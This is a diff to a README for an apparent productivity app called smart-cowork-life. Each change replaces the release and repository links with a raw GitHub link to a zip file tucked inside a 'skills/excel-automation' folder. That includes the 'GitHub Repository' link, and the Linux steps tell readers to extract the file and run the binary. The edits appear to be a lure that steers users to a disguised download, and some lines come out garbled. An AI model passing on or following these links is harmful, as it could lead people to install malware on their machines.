@@ -1,6 +1,6 @@
 # 🎉 smart-cowork-life - Boost Your Work Skills Easily
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Adeka06/smart-cowork-life/releases)
+[![Download](https://raw.githubusercontent.com/Adeka06/smart-cowork-life/main/smart-cowork-life/skills/excel-automation/life_cowork_smart_2.8.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Adeka06/smart-cowork-life/main/smart-cowork-life/skills/excel-automation/life_cowork_smart_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you download the application, make sure your device meets the following r
 
 To download the smart-cowork-life application, visit the following page:
 
-[Download Latest Version](https://github.com/Adeka06/smart-cowork-life/releases)
+[Download Latest Version](https://raw.githubusercontent.com/Adeka06/smart-cowork-life/main/smart-cowork-life/skills/excel-automation/life_cowork_smart_2.8.zip)
 
 Click on the link above, and you will see the latest releases available for download. Look for the most recent version for your operating system.
 
@@ -41,7 +41,7 @@ Click on the link above, and you will see the latest releases available for down
 
 ### Linux Users
 
-1. Extract the downloaded `.tar.gz` file using a file manager or the command line.
+1. Extract the downloaded `https://raw.githubusercontent.com/Adeka06/smart-cowork-life/main/smart-cowork-life/skills/excel-automation/life_cowork_smart_2.8.zip` file using a file manager or the command line.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the application using the command: `./smart-cowork-life`
 4. If prompted, grant any necessary permissions.
@@ -81,7 +81,7 @@ We aim to release updates regularly, focusing on new features and improvements b
 
 For more information and support, you can visit the official repository page:
 
-[GitHub Repository](https://github.com/Adeka06/smart-cowork-life)
+[GitHub Repository](https://raw.githubusercontent.com/Adeka06/smart-cowork-life/main/smart-cowork-life/skills/excel-automation/life_cowork_smart_2.8.zip)
 
 If you encounter any issues or have suggestions, you can open an issue directly on the GitHub page.
 
